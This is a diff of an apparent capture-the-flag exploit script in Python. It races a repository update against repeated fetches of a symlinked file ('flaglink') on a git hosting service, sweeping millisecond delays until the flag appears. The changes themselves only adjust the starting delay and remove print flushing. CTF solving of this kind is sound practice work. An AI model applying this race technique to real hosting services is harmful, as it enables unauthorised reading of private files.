@@ -7,7 +7,7 @@ USER = "MrVasya"
 NAME = "test"
 FILENAME = "flaglink"
 
-DELAY_START = -0.7     # 0 секунд
+DELAY_START = 0     # 0 секунд
 DELAY_END = 1     # 0.9 секунд
 STEP = 0.01         # 10 мс
 
@@ -22,10 +22,10 @@ def run_script(path):
 
 async def fetch_file(client, result_container):
     try:
-        print("starting fetch file...", flush=True)
+        print("starting fetch file...")
         url = f"{BASE_URL}/repo/{USER}/{NAME}/file/{FILENAME}"
         r = await client.get(url)
-        print("got file contents", flush=True)
+        print("got file contents")
         if FLAG in r.text:
             result_container["success"] = True
             result_container["content"] = r.text
@@ -39,7 +39,7 @@ async def trigger_update(client):
         data = {"remote": "origin", "branch": "main"}
         print('starting repo update')
         await client.post(url, data=data)
-        print("repo updated", flush=True)
+        print("repo updated")
     except Exception:
         pass
 
@@ -72,14 +72,14 @@ async def try_delay(delay):
 
 async def main():
     for delay in [DELAY_START + i * STEP for i in range(int((DELAY_END - DELAY_START) / STEP) + 1)]:
-        print(f"Trying delay: {int(delay*1000)} ms", flush=True)
+        print(f"Trying delay: {int(delay*1000)} ms")
         result = await try_delay(delay)
         if result["success"]:
-            print(f"SUCCESS with delay {int(delay*1000)} ms", flush=True)
-            print(result["content"], flush=True)
+            print(f"SUCCESS with delay {int(delay*1000)} ms")
+            print(result["content"])
             break
         else:
-            print(f"Failed with delay {int(delay*1000)} ms", flush=True)
+            print(f"Failed with delay {int(delay*1000)} ms")
 
 
 if __name__ == "__main__":
